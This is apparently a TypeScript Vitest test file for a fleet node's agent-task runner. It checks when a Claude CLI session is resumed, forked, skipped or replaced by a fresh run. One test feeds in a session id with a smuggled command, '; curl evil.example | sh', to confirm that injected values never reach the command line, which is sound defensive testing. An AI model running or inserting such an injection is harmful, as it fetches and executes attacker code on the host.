import { describe, expect, it, vi } from 'vitest';
import type { FleetJobView, FleetTaskWorkspaceDescriptor } from '@ever-works/contracts';
import { join } from 'node:path';
import { runAgentTaskJob, type AgentTaskIo, type AgentTaskScratchFs } from './agent-task';
import type { AgentTaskQuestionFs } from './agent-task-question';

/**
 * Self-build slice AU — fleet run continuity on the node.
 *
 * An answered owner question used to restart the model from zero. A job may
 * now carry `execution.resume`: the CLI session an earlier run of the Task
 * left on ONE node, and a continuation prompt. What these pin, in order of
 * how much it would hurt to lose:
 *
 *   1. Only the node that holds the session resumes it — decided against
 *      the node's OWN enrollment id — and it does so with
 *      `--resume <id> --fork-session`, the continuation on STDIN (never
 *      argv), under every flag a fresh run gets.
 *   2. When the CLI cannot open the session at all (unknown id → exit 1,
 *      no session, no turn), the node runs the job fresh on the FULL
 *      instructions — the run is never lost to a stale optimisation.
 *   3. A resumed session that RAN and then failed is not re-run: that would
 *      spend the model twice on work it already did.
 *   4. Any other node, a provider that cannot resume (Codex), a node that
 *      does not know its own id, or a malformed offer → fresh session,
 *      and the run says which.
 *   5. A job with no offer reports exactly what it always did.
 */

const ABSOLUTE = process.platform === 'win32' ? 'C:\\workspace' : '/workspace';
const CLAUDE = process.platform === 'win32' ? 'C:\\npm\\claude.cmd' : '/usr/local/bin/claude';
const CODEX = process.platform === 'win32' ? 'C:\\npm\\codex.cmd' : '/usr/local/bin/codex';
const SCRATCH = process.platform === 'win32' ? 'C:\\scratch' : '/scratch';

const SELF = '11111111-1111-4111-8111-111111111111';
const OTHER = '22222222-2222-4222-8222-222222222222';
const SESSION = '3f0e9a52-7b1c-4d2e-9a8f-0c1d2e3f4a5b';
const FORKED = '9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d';

const FULL = '# TASK\nFix the thing.\n\n# EARLIER QUESTIONS AND ANSWERS\nQuestion 1: Which DB?\nAnswer: Postgres.';
const CONTINUATION = '# OWNER ANSWER\n\nUse Postgres.\n\n# CONTINUE\nPick up from the answer.';

const descriptor: FleetTaskWorkspaceDescriptor = {
	path: ABSOLUTE,
	repositoryId: 'ever-works/ever-works',
	baseRef: 'develop',
	branch: 'task/t1-fix',
	baseSha: 'a'.repeat(40),
	headSha: 'a'.repeat(40),
	reused: true
};

function job(payload: unknown): FleetJobView {
	return {
		id: 'job-au',
		kind: 'agent-task',
		status: 'leased',
		nodeId: SELF,
		requiredCapabilities: [],
		payload: payload as Record<string, unknown>,
		leaseExpiresAt: null,
		attempts: 1,
		maxAttempts: 3,
		createdAt: null,
		startedAt: null,
		completedAt: null
	};
}

function envelope(over: Record<string, unknown> = {}): string {
	return JSON.stringify({
		type: 'result',
		subtype: 'success',
		is_error: false,
		result: 'Implemented the change.',
		total_cost_usd: 0.25,
		num_turns: 2,
		session_id: FORKED,
		...over
	});
}

/**
 * In-memory scratch filesystem. `outputs` is what each successive READ of
 * `model-output.json` returns — one entry per model invocation — and every
 * write of `instructions.md` is kept in order, so a test sees exactly what
 * each invocation read on stdin.
 */
function scratchFs(outputs: Array<string | null>) {
	const queue = [...outputs];
	const instructions: string[] = [];
	const fs: AgentTaskScratchFs & { instructions: string[]; outputResets: number } = {
		instructions,
		outputResets: 0,
		createScratchDir: async (root, prefix) => join(root, `${prefix}-scratch`),
		writeFile: async (path, content) => {
			if (path.endsWith('instructions.md')) instructions.push(content);
			// Slice AP × AU: the fallback empties the shared output file first.
			if (path.endsWith('model-output.json') && content === '') fs.outputResets += 1;
		},
		readFile: async (path) => (path.endsWith('model-output.json') ? (queue.shift() ?? null) : null),
		remove: async () => undefined,
		mkdir: async () => undefined
	};
	return fs;
}

const noQuestion: AgentTaskQuestionFs = {
	readHead: async () => null,
	remove: async () => undefined,
	removeDirIfEmpty: async () => undefined
};

/** Spawn double: records every command; exit codes scripted by substring. */
function recordingSpawn(
	exitCodes: Array<[match: string, code: number]>,
	/** What a matching command prints on stderr before it exits (slice AU review). */
	stderrFor: Array<[match: string, text: string]> = []
) {
	const commands: string[] = [];
	const spawnFn = ((command: string) => {
		commands.push(command);
		const handlers = new Map<string, (arg?: unknown) => void>();
		let onStderr: ((chunk: Buffer) => void) | null = null;
		queueMicrotask(() => {
			const said = stderrFor.find(([match]) => command.includes(match));
			if (said && onStderr) onStderr(Buffer.from(said[1]));
			const hit = exitCodes.find(([match]) => command.includes(match));
			handlers.get('close')?.(hit ? hit[1] : 0);
		});
		return {
			stdout: { on: () => undefined, destroy: () => undefined },
			stderr: {
				on: (event: string, handler: (chunk: Buffer) => void) => {
					if (event === 'data') onStderr = handler;
				},
				destroy: () => undefined
			},
			on: (event: string, handler: (arg?: unknown) => void) => {
				handlers.set(event, handler);
			},
			kill: () => undefined
		};
	}) as never;
	return { commands, spawnFn };
}

function io(over: Partial<AgentTaskIo> & { fs: ReturnType<typeof scratchFs> }): AgentTaskIo {
	const { fs, ...rest } = over;
	return {
		directoryExists: () => true,
		provisionWorkspace: vi.fn(async () => descriptor),
		finalizeWorkspace: vi.fn(async () => ({ pushed: true, headSha: 'b'.repeat(40), empty: false })),
		modelCli: { 'claude-code': CLAUDE, codex: CODEX },
		scratchRoot: SCRATCH,
		scratchFs: fs,
		sessionConfigFs: { readFile: async () => null },
		questionFs: noQuestion,
		nodeId: SELF,
		...rest
	};
}

function payload(execution: Record<string, unknown>): Record<string, unknown> {
	return {
		taskId: 't1',
		runId: 'run-2',
		agentId: 'agent-1',
		workspace: {
			repositoryId: 'ever-works/ever-works',
			repoUrl: 'https://github.com/ever-works/ever-works.git',
			baseRef: 'develop',
			branch: 'task/t1-fix'
		},
		execution: { provider: 'claude-code', instructions: FULL, ...execution },
		acceptanceChecks: []
	};
}

const offer = (over: Record<string, unknown> = {}) => ({
	resume: { sessionId: SESSION, nodeId: SELF, instructions: CONTINUATION, ...over }
});

const modelCommands = (commands: string[]) =>
	commands.filter((command) => command.includes(CLAUDE) || command.includes(CODEX));

describe('runAgentTaskJob — CLI session resume (self-build slice AU)', () => {
	it('⭐ continues the session on the node that holds it: --resume + --fork-session, continuation on stdin', async () => {
		const fs = scratchFs([envelope()]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn }));

		const model = modelCommands(commands);
		expect(model).toHaveLength(1);
		expect(model[0]).toContain(`--resume ${SESSION} --fork-session`);
		// Every flag a fresh run gets still applies to the continued session —
		// including slice AP's line-delimited event stream, the node default.
		expect(model[0]).toContain('-p --output-format stream-json --verbose --permission-mode acceptEdits');
		// The continuation travels on stdin — never on argv.
		expect(model[0]).not.toContain('Use Postgres');
		expect(fs.instructions).toEqual([CONTINUATION]);
		expect(outcome.status).toBe('succeeded');
		expect(outcome.model).toMatchObject({
			status: 'succeeded',
			sessionId: FORKED,
			resume: { outcome: 'resumed' }
		});
	});

	it('matches its own id case-insensitively (both sides are UUIDs)', async () => {
		const fs = scratchFs([envelope()]);
		const { commands, spawnFn } = recordingSpawn([]);

		await runAgentTaskJob(job(payload(offer({ nodeId: SELF.toUpperCase() }))), io({ fs, spawnFn }));

		expect(modelCommands(commands)[0]).toContain(`--resume ${SESSION}`);
	});

	it('⭐ takes the forked session id from the FINAL `result` line of a stream-json run (slice AP × AU)', async () => {
		// The stream's init line still names the session that was resumed;
		// only the closing `result` envelope carries the id `--fork-session`
		// wrote the continuation to — the one the next answer must resume.
		const stream = [
			JSON.stringify({ type: 'system', subtype: 'init', session_id: SESSION }),
			JSON.stringify({
				type: 'assistant',
				session_id: FORKED,
				message: { content: [{ type: 'text', text: 'Picking up from the answer.' }] }
			}),
			envelope()
		].join('\n');
		const fs = scratchFs([stream]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn }));

		const model = modelCommands(commands);
		expect(model).toHaveLength(1);
		expect(model[0]).toContain('--output-format stream-json --verbose');
		expect(model[0]).toContain(`--resume ${SESSION} --fork-session`);
		expect(outcome.model).toMatchObject({
			status: 'succeeded',
			sessionId: FORKED,
			resume: { outcome: 'resumed' }
		});
	});

	it('with run evidence off, a resumed run keeps the single-document json command (slice AP × AU)', async () => {
		const fs = scratchFs([envelope()]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn, modelTranscript: 'off' }));

		const model = modelCommands(commands);
		expect(model).toHaveLength(1);
		expect(model[0]).toContain('-p --output-format json --permission-mode acceptEdits');
		expect(model[0]).not.toContain('stream-json');
		expect(model[0]).toContain(`--resume ${SESSION} --fork-session`);
		expect(outcome.model).toMatchObject({ sessionId: FORKED, resume: { outcome: 'resumed' } });
	});

	it('⭐ falls back to a FRESH session on the full instructions when the CLI cannot open the session', async () => {
		// `claude --resume <unknown>` prints "No conversation found" on stderr,
		// nothing on stdout, and exits 1 — before any model turn.
		const fs = scratchFs([null, envelope({ session_id: 'fresh-session' })]);
		const { commands, spawnFn } = recordingSpawn(
			[['--resume', 1]],
			[['--resume', `No conversation found with session ID: ${SESSION}`]]
		);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn }));

		const model = modelCommands(commands);
		expect(model).toHaveLength(2);
		expect(model[0]).toContain(`--resume ${SESSION}`);
		expect(model[1]).not.toContain('--resume');
		expect(model[1]).not.toContain('--fork-session');
		// The fallback read the COMPLETE prompt, answered trail included.
		expect(fs.instructions).toEqual([CONTINUATION, FULL]);
		// …and started from an EMPTY output file, so the live evidence reader
		// could not mistake the failed attempt's bytes for its own (AP × AU).
		expect(fs.outputResets).toBe(1);
		expect(outcome.status).toBe('succeeded');
		expect(outcome.model).toMatchObject({
			status: 'succeeded',
			sessionId: 'fresh-session',
			resume: {
				outcome: 'fell-back',
				reason: expect.stringContaining('could not open the earlier session')
			}
		});
	});

	it('falls back for a CLI too old to know --fork-session, which also exits before any model turn', async () => {
		const fs = scratchFs([null, envelope({ session_id: 'fresh-session' })]);
		const { commands, spawnFn } = recordingSpawn(
			[['--resume', 1]],
			[['--resume', "error: unknown option '--fork-session'"]]
		);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn }));

		expect(modelCommands(commands)).toHaveLength(2);
		expect(outcome.model?.resume?.outcome).toBe('fell-back');
	});

	it('⭐ does NOT re-run a resumed CLI that crashed without saying why — the worktree may already be changed (review)', async () => {
		// Killed / crashed mid-session: no final JSON, so no session id and no
		// turns — exactly like "never opened", except it may have edited files
		// and spent money. Missing fields are not proof; only the CLI's own
		// "could not open" message is.
		const fs = scratchFs([null, envelope({ session_id: 'must-not-run' })]);
		const { commands, spawnFn } = recordingSpawn([['--resume', 1]], [['--resume', 'Error: socket hang up']]);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn }));

		expect(modelCommands(commands)).toHaveLength(1);
		expect(fs.instructions).toEqual([CONTINUATION]);
		expect(outcome.status).toBe('failed');
		expect(outcome.model).toMatchObject({ status: 'failed', resume: { outcome: 'resumed' } });
		expect(outcome.model?.sessionId).toBeFalsy();
	});

	it('does NOT re-run a resumed session that ran and then failed — that would spend the model twice', async () => {
		const fs = scratchFs([
			envelope({ subtype: 'error_max_turns', is_error: true, result: 'Ran out of turns.', num_turns: 30 })
		]);
		const { commands, spawnFn } = recordingSpawn([['--resume', 1]]);

		const outcome = await runAgentTaskJob(job(payload(offer())), io({ fs, spawnFn }));

		expect(modelCommands(commands)).toHaveLength(1);
		expect(outcome.status).toBe('failed');
		expect(outcome.model).toMatchObject({
			status: 'failed',
			sessionId: FORKED,
			resume: { outcome: 'resumed' }
		});
	});

	it.each<[string, Record<string, unknown>, Partial<AgentTaskIo>, string]>([
		['another node holds the session', { nodeId: OTHER }, {}, 'another fleet node'],
		['this node does not know its own id', {}, { nodeId: undefined }, 'enrollment id']
	])('runs fresh and says so when %s', async (_label, offerOver, ioOver, reason) => {
		const fs = scratchFs([envelope()]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(job(payload(offer(offerOver))), io({ fs, spawnFn, ...ioOver }));

		const model = modelCommands(commands);
		expect(model).toHaveLength(1);
		expect(model[0]).not.toContain('--resume');
		expect(fs.instructions).toEqual([FULL]);
		expect(outcome.model?.resume).toEqual({ outcome: 'skipped', reason: expect.stringContaining(reason) });
	});

	it('never resumes Codex — `codex exec resume` cannot be held to the run’s sandbox', async () => {
		const codexEvents = [
			JSON.stringify({ type: 'thread.started', thread_id: FORKED }),
			JSON.stringify({ type: 'item.completed', item: { type: 'agent_message', text: 'Done.' } }),
			JSON.stringify({ type: 'turn.completed', usage: { input_tokens: 10, output_tokens: 5 } })
		].join('\n');
		const fs = scratchFs([codexEvents]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(job(payload({ provider: 'codex', ...offer() })), io({ fs, spawnFn }));

		const model = modelCommands(commands);
		expect(model).toHaveLength(1);
		expect(model[0]).toContain('exec --json');
		expect(model[0]).not.toContain('resume');
		expect(fs.instructions).toEqual([FULL]);
		expect(outcome.model?.resume).toEqual({ outcome: 'skipped', reason: expect.stringContaining('codex') });
	});

	it('drops a malformed offer at the wire and runs fresh — the session id never reaches argv', async () => {
		const fs = scratchFs([envelope()]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(
			job(payload(offer({ sessionId: `${SESSION}; curl evil.example | sh` }))),
			io({ fs, spawnFn })
		);

		const model = modelCommands(commands);
		expect(model).toHaveLength(1);
		expect(model[0]).not.toContain('--resume');
		expect(model[0]).not.toContain('curl');
		expect(fs.instructions).toEqual([FULL]);
		// Dropped before the executor saw it: nothing was offered, nothing to report.
		expect(outcome.model).not.toHaveProperty('resume');
	});

	it('reports exactly what it always did for a job with no offer', async () => {
		const fs = scratchFs([envelope()]);
		const { commands, spawnFn } = recordingSpawn([]);

		const outcome = await runAgentTaskJob(job(payload({})), io({ fs, spawnFn }));

		expect(modelCommands(commands)[0]).not.toContain('--resume');
		expect(fs.instructions).toEqual([FULL]);
		expect(outcome.model).not.toHaveProperty('resume');
	});
});
